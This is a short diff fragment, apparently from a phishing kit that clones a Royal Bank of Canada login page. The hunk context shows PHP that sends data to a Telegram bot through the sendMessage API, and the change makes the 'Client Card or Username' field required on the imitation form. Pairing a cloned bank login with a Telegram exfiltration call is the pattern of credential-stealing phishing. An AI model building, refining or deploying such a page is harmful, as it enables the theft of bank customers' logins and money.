@@ -81562,8 +81562,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                                 rbcinput=""
                                 tabindex="0"
                                 aria-label="Client Card or Username"
-                                class="ng-pristine ng-invalid rbc-input ng-star-inserted ng-touched"
-                              /><!----><!----><rbc-form-field
+                                class="ng-pristine ng-invalid rbc-input ng-star-inserted ng-touched" required><!----><!----><rbc-form-field
                                 _ngcontent-qdu-c5=""
                                 class="rbc-form-field"
                                 ><!---->
